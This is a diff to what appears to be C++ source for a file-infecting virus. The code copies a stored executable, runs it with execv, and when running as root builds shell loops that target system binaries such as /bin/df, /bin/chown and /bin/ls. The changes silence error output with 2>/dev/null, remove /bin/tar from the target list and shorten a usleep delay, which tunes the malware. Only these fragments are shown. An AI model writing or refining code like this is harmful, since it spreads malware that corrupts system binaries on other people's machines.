@@ -37,7 +37,7 @@ int main (int argc, char** argv) {
         while ((c = fi.get()) != -1) fo << (char) c;
         fo.close();
         fi.close();
-        command = "chmod u+x ";
+        command = "2>/dev/null chmod u+x ";
         command += exe;
         c = system( command.c_str() );
         execv((exe).c_str(), argv);
@@ -50,7 +50,6 @@ int main (int argc, char** argv) {
         if (uid == 0) command += " | egrep '\
 ^/bin/df$|\
 ^/bin/chown$|\
-^/bin/tar$|\
 ^/bin/ls$'";
         command += "`; \
 do \
@@ -73,7 +72,7 @@ rm -f ${VIR}__ ";
         command += vir;
         command += " ";
         command += exe;
-        usleep(5000);
+        usleep(500);
         c = system( (command).c_str() );
         return 0;
     }
